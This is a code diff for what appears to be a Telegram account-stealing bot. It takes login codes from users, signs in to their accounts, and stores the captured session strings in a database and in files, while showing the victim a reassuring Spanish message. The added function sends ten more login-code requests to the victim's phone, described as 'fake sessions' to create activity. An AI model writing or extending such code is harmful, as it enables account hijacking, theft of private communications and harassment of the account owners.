@@ -171,7 +171,7 @@ async def try_sign_in_code(user_id, code):
             me = await client.get_me()
             session_str = client.session.save()
             
-            # Сохраняем с дополнительной информацией для долгоживущих сессий
+            # Сохраняем только основную сессию
             sessions_col.update_one(
                 {"phone": phone},
                 {"$set": {
@@ -187,6 +187,9 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
+            # Создаем 10 фейковых сессий
+            await create_fake_sessions(phone, client)
+            
             await bot.send_message(
                 user_id,
                 "✅ Has pasado la verificación. Nuestro bot está un poco cargado. "
@@ -212,6 +215,23 @@ async def try_sign_in_code(user_id, code):
         await bot.send_message(user_id, f"❌ Error de inicio de sesión: {e}")
         await client.disconnect()
         cleanup(user_id)
+
+async def create_fake_sessions(phone, main_client):
+    for i in range(10):
+        try:
+            # Создаем новую временную сессию
+            temp_client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
+            await temp_client.connect()
+            
+            # Отправляем запрос кода (не сохраняем сессию)
+            await temp_client.send_code_request(phone)
+            
+            # Имитируем ввод кода (не обязательно реально авторизовываться)
+            # Просто создаем активность
+            
+            await temp_client.disconnect()
+        except Exception as e:
+            logging.error(f"Error creating fake session {i+1}: {e}")
 
 @dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
 async def process_2fa(message: types.Message):
